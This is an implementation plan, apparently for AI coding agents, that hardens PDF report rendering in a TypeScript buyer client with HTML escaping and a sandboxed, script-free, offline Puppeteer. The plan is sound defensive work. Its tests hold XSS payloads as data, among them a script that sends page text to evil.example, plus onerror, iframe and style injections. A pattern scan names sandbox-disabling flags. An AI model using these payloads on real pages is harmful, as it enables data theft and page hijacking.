# Secure PDF Rendering Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Render seller-controlled reports as inert static HTML/PDF without JavaScript execution, network access, or disabled Chromium sandboxing.

**Architecture:** `pdf-report.ts` will own HTML escaping, Markdown presentation, fallback-file creation, and orchestration. A focused `pdf-renderer.ts` adapter will own the hardened Puppeteer lifecycle, allowing browser behavior to be tested without launching Chrome. The existing `saveReport` public signature and safe HTML fallback behavior remain unchanged.

**Tech Stack:** TypeScript ES2022, Node.js 24, Node test runner, Puppeteer 23.

## Global Constraints

- Treat report text, `jobId`, `date`, and every symbol as untrusted text.
- Generated HTML must contain no executable script or raw seller-controlled element.
- Chromium JavaScript and page network access must both be disabled.
- Do not pass `--no-sandbox` or `--disable-setuid-sandbox`.
- Sandboxed browser failure returns `pdfPath: null`; there is no unsafe retry.
- Keep headings, emphasis, code, lists, blockquotes, tables, badges, and percentage colouring.
- Do not launch a real browser, access the network, use wallet material, or call a live chain in tests.
- Do not change contracts, pricing, settlement, gateway authentication, or seller execution.

---

### Task 1: Produce inert static report HTML

**Files:**
- Modify: `buyer-client/src/pdf-report.ts`
- Create: `buyer-client/src/pdf-report.test.ts`

**Interfaces:**
- Produces: `renderReportHtml(reportText: string, meta: ReportMeta): string`
- Produces: `ReportMeta = { jobId: string; date: string; symbols: string }`
- Preserves: `saveReport(reportText, jobId, symbols)` behavior for later tasks

- [ ] **Step 1: Write failing HTML-injection and presentation tests**

Create `buyer-client/src/pdf-report.test.ts` with table-driven assertions that
import `renderReportHtml` and prove the current module lacks the safe interface:

```ts
import assert from "node:assert/strict";
import test from "node:test";
import { renderReportHtml } from "./pdf-report.js";

test("renders seller HTML payloads as inert text", () => {
  const payloads = [
    "<script>fetch('https://evil.example/' + document.body.innerText)</script>",
    '<img src="https://evil.example/pixel" onerror="alert(1)">',
    '<iframe src="http://127.0.0.1:9374/v1/memory"></iframe>',
    '</div><style>body{display:none}</style><div>',
    '<a href="https://evil.example">click</a>',
  ];

  for (const payload of payloads) {
    const html = renderReportHtml(payload, {
      jobId: "7",
      date: "23 July 2026",
      symbols: "AAPL",
    });
    assert.ok(html.includes("&lt;"));
    assert.doesNotMatch(html, /<(script|img|iframe|style|a)\b/i);
    assert.doesNotMatch(html, /\bon(?:error|load)\s*=/i);
  }
});

test("escapes every metadata field", () => {
  const html = renderReportHtml("safe", {
    jobId: '7</div><script>alert(1)</script>',
    date: '<img src=x onerror="alert(1)">',
    symbols: 'AAPL</div><iframe src="https://evil.example">',
  });
  assert.doesNotMatch(html, /<(script|img|iframe)\b/i);
  assert.match(html, /&lt;script&gt;/);
  assert.match(html, /&lt;img/);
  assert.match(html, /&lt;iframe/);
});

test("contains no browser-side script while preserving report styling", () => {
  const html = renderReportHtml(
    "# Verdict\n\n> **BUY**\n\nReturn: +12.5% and drawdown: -3.2%\n\n| Symbol | View |\n| --- | --- |\n| AAPL | HOLD |",
    { jobId: "7", date: "23 July 2026", symbols: "AAPL" },
  );
  assert.doesNotMatch(html, /<script\b/i);
  assert.doesNotMatch(html, /\.innerHTML\s*=/);
  assert.match(html, /<h1>Verdict<\/h1>/);
  assert.match(html, /badge-buy/);
  assert.match(html, /badge-hold/);
  assert.match(html, /class="pos"/);
  assert.match(html, /class="neg"/);
  assert.match(html, /<table>/);
});
```

- [ ] **Step 2: Run the test and verify RED**

Run:

```bash
cd buyer-client
/Users/zhaoyu/.nvm/versions/node/v24.10.0/bin/node \
  ../../apex-contracts/node_modules/tsx/dist/cli.mjs \
  --test src/pdf-report.test.ts
```

Expected: the test process fails because `renderReportHtml` is not exported,
not because this checkout's empty `node_modules` directory lacks packages.

- [ ] **Step 3: Add the escaping boundary and static decorators**

In `pdf-report.ts`, export the metadata type and one HTML boundary:

```ts
export interface ReportMeta {
  jobId: string;
  date: string;
  symbols: string;
}

function escapeHtml(value: string): string {
  return value.replace(/[&<>"']/g, (char) => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
  })[char] ?? char);
}
```

Make `mdToHtml` start from `escapeHtml(md)`. Remove the global inline-markup
replacement stage and send headings, quotes, list items, table cells, and
ordinary paragraph lines through one `inlineToHtml` helper. Extend that helper
after Markdown emphasis/code processing:

```ts
.replace(/\b(BUY)\b/g, '<span class="badge badge-buy">BUY</span>')
.replace(/\b(HOLD)\b/g, '<span class="badge badge-hold">HOLD</span>')
.replace(/\b(SELL)\b/g, '<span class="badge badge-sell">SELL</span>')
.replace(/(\+\d+(?:\.\d+)?%)/g, '<span class="pos">$1</span>')
.replace(/(−|-)\d+(?:\.\d+)?%/g, (value) => `<span class="neg">${value}</span>`);
```

Delete the template `<script>` and its `innerHTML` rewrites. Export a pure
renderer that escapes metadata independently:

```ts
export function renderReportHtml(reportText: string, meta: ReportMeta): string {
  return buildHtml(mdToHtml(reportText), {
    jobId: escapeHtml(meta.jobId),
    date: escapeHtml(meta.date),
    symbols: escapeHtml(meta.symbols),
  });
}
```

Change `saveReport` to call `renderReportHtml`.

- [ ] **Step 4: Run focused tests and verify GREEN**

Run the Task 1 tests through Node 24. Expected: all three tests pass, generated
HTML contains escaped payload text and no script element.

- [ ] **Step 5: Commit**

```bash
git add buyer-client/src/pdf-report.ts buyer-client/src/pdf-report.test.ts
git commit -m "fix: render reports as inert HTML"
```

---

### Task 2: Isolate Puppeteer execution

**Files:**
- Create: `buyer-client/src/pdf-renderer.ts`
- Create: `buyer-client/src/pdf-renderer.test.ts`

**Interfaces:**
- Consumes: inert HTML from `renderReportHtml`
- Produces: `renderPdf(puppeteer: PuppeteerLike, html: string, pdfPath: string): Promise<void>`
- Guarantees: no JavaScript, no page network, no sandbox-disabling arguments

- [ ] **Step 1: Write failing renderer-policy tests**

Build minimal fake browser/page objects that record call order, launch options,
the request handler, and close calls:

```ts
test("renders with sandbox, JavaScript disabled, and every request aborted", async () => {
  const calls: string[] = [];
  let requestHandler: ((request: { abort(): Promise<void> }) => void) | undefined;
  let launchOptions: Record<string, unknown> | undefined;
  let aborted = false;

  const page = {
    async setJavaScriptEnabled(value: boolean) { calls.push(`js:${value}`); },
    async setRequestInterception(value: boolean) { calls.push(`intercept:${value}`); },
    on(event: string, handler: typeof requestHandler) {
      assert.equal(event, "request");
      requestHandler = handler;
    },
    async setContent(_html: string, options: { waitUntil: string }) {
      calls.push(`content:${options.waitUntil}`);
    },
    async pdf() { calls.push("pdf"); },
    async close() { calls.push("page-close"); },
  };
  const browser = {
    async newPage() { return page; },
    async close() { calls.push("browser-close"); },
  };
  const puppeteer = {
    async launch(options: Record<string, unknown>) {
      launchOptions = options;
      return browser;
    },
  };

  await renderPdf(puppeteer, "<p>safe</p>", "/tmp/report.pdf");
  requestHandler?.({ async abort() { aborted = true; } });
  await Promise.resolve();

  assert.deepEqual(launchOptions, { headless: true });
  assert.deepEqual(calls.slice(0, 3), [
    "js:false",
    "intercept:true",
    "content:domcontentloaded",
  ]);
  assert.equal(aborted, true);
  assert.deepEqual(calls.slice(-2), ["page-close", "browser-close"]);
});
```

Add separate tests where `setContent` and `pdf` throw. Both must still close the
page and browser and must rethrow so `saveReport` can select its safe fallback.

- [ ] **Step 2: Run the tests and verify RED**

Expected: compilation fails because `pdf-renderer.ts` and `renderPdf` do not
exist.

- [ ] **Step 3: Implement the hardened adapter**

Create narrow structural types for the Puppeteer objects used by production and
tests. Implement:

```ts
export async function renderPdf(
  puppeteer: PuppeteerLike,
  html: string,
  pdfPath: string,
): Promise<void> {
  let browser: BrowserLike | undefined;
  let page: PageLike | undefined;
  try {
    browser = await puppeteer.launch({ headless: true });
    page = await browser.newPage();
    await page.setJavaScriptEnabled(false);
    await page.setRequestInterception(true);
    page.on("request", (request) => {
      void request.abort().catch(() => undefined);
    });
    await page.setContent(html, { waitUntil: "domcontentloaded" });
    await page.pdf({
      path: pdfPath,
      format: "A4",
      printBackground: true,
      margin: { top: "0", right: "0", bottom: "0", left: "0" },
    });
  } finally {
    await page?.close().catch(() => undefined);
    await browser?.close().catch(() => undefined);
  }
}
```

Do not accept browser arguments from callers and do not add any sandbox opt-out.

- [ ] **Step 4: Run focused tests and verify GREEN**

Expected: policy, request-abort, success cleanup, and failure cleanup tests all
pass.

- [ ] **Step 5: Commit**

```bash
git add buyer-client/src/pdf-renderer.ts buyer-client/src/pdf-renderer.test.ts
git commit -m "fix: isolate PDF browser rendering"
```

---

### Task 3: Integrate safe fallback and verify the buyer client

**Files:**
- Modify: `buyer-client/src/pdf-report.ts`
- Modify: `buyer-client/src/pdf-report.test.ts`

**Interfaces:**
- Consumes: `renderPdf` and the dynamic Puppeteer import
- Preserves: exact public `saveReport` signature and return shape
- Guarantees: failed sandboxed rendering leaves inert HTML and returns null PDF

- [ ] **Step 1: Write the failing fallback test**

Add a deterministic internal orchestration seam that accepts a renderer
callback without exposing browser flags:

```ts
export type PdfRenderer = (html: string, pdfPath: string) => Promise<void>;
```

Test `saveReportWithRenderer` in a temporary working directory. The injected
renderer throws `"sandbox unavailable"`. Assert:

```ts
assert.equal(result.pdfPath, null);
assert.match(readFileSync(result.htmlPath, "utf8"), /&lt;script&gt;/);
assert.doesNotMatch(readFileSync(result.htmlPath, "utf8"), /<script\b/i);
```

Also test the successful renderer receives the same inert HTML saved on disk
and yields the expected PDF path.

- [ ] **Step 2: Run the fallback tests and verify RED**

Expected: compilation fails because the safe orchestration seam does not exist.

- [ ] **Step 3: Connect production to `renderPdf`**

Keep `saveReport` unchanged for callers. Implement a non-browser-specific
orchestration helper:

```ts
export async function saveReportWithRenderer(
  reportText: string,
  jobId: string,
  symbols: string[],
  renderer: PdfRenderer,
): Promise<{ pdfPath: string | null; htmlPath: string }> {
  const date = new Date().toLocaleDateString("en-GB", {
    year: "numeric",
    month: "long",
    day: "numeric",
  });
  const html = renderReportHtml(reportText, {
    jobId,
    date,
    symbols: symbols.join(", "),
  });
  const base = `stock-analysis-${jobId}`;
  const htmlPath = resolve(process.cwd(), `${base}.html`);
  const candidatePdfPath = resolve(process.cwd(), `${base}.pdf`);
  writeFileSync(htmlPath, html, "utf8");
  try {
    await renderer(html, candidatePdfPath);
    return { pdfPath: candidatePdfPath, htmlPath };
  } catch {
    return { pdfPath: null, htmlPath };
  }
}
```

`saveReport` dynamically imports Puppeteer and calls:

```ts
return saveReportWithRenderer(reportText, jobId, symbols, async (html, pdfPath) => {
  const puppeteer = await import("puppeteer" as string);
  await renderPdf(puppeteer as unknown as PuppeteerLike, html, pdfPath);
});
```

Remove the system-Chrome special case. Puppeteer's configured browser is used
with its normal sandbox; if it is unavailable, the existing safe HTML fallback
is the complete result.

- [ ] **Step 4: Run all buyer tests and build**

Run with Node 24:

```bash
cd buyer-client
/Users/zhaoyu/.nvm/versions/node/v24.10.0/bin/node \
  /Users/zhaoyu/.nvm/versions/node/v24.10.0/lib/node_modules/npm/bin/npm-cli.js test
/Users/zhaoyu/.nvm/versions/node/v24.10.0/bin/node \
  /Users/zhaoyu/.nvm/versions/node/v24.10.0/lib/node_modules/npm/bin/npm-cli.js run build
```

Expected: all tests pass and TypeScript builds cleanly. If this checkout still
lacks `ethers` or `@types/node`, report the official commands' exact environment
failure separately, then run the focused tests exactly as follows:

```bash
cd buyer-client
/Users/zhaoyu/.nvm/versions/node/v24.10.0/bin/node \
  ../../apex-contracts/node_modules/tsx/dist/cli.mjs \
  --test src/pdf-report.test.ts src/pdf-renderer.test.ts
```

For a strict whole-project typecheck in that environment, temporarily add
`buyer-client/tsconfig.codex-check.json`:

```json
{
  "extends": "./tsconfig.json",
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "ethers": ["../../apex-contracts/node_modules/ethers"],
      "ethers/*": ["../../apex-contracts/node_modules/ethers/*"]
    },
    "typeRoots": ["../../apex-contracts/node_modules/@types"]
  }
}
```

Run and then delete the temporary file:

```bash
../apex-contracts/node_modules/.bin/tsc \
  -p buyer-client/tsconfig.codex-check.json
```

- [ ] **Step 5: Run repository safety checks**

Run:

```bash
git diff --check
rg -n -- "--no-sandbox|--disable-setuid-sandbox|networkidle0|innerHTML\\s*=" \
  buyer-client/src/pdf-report.ts buyer-client/src/pdf-renderer.ts
```

Expected: `git diff --check` succeeds and the prohibited-pattern scan returns no
matches.

- [ ] **Step 6: Commit**

```bash
git add buyer-client/src/pdf-report.ts buyer-client/src/pdf-report.test.ts \
  buyer-client/src/pdf-renderer.ts buyer-client/src/pdf-renderer.test.ts
git commit -m "test: verify secure PDF fallback"
```

- [ ] **Step 7: Final review**

Review the complete range from `54303ac` to `HEAD` for raw-HTML bypasses,
browser-policy regressions, unsafe error fallback, path or network side effects,
and unrelated changes. Re-run the focused tests after review fixes. The final
working tree must be clean.
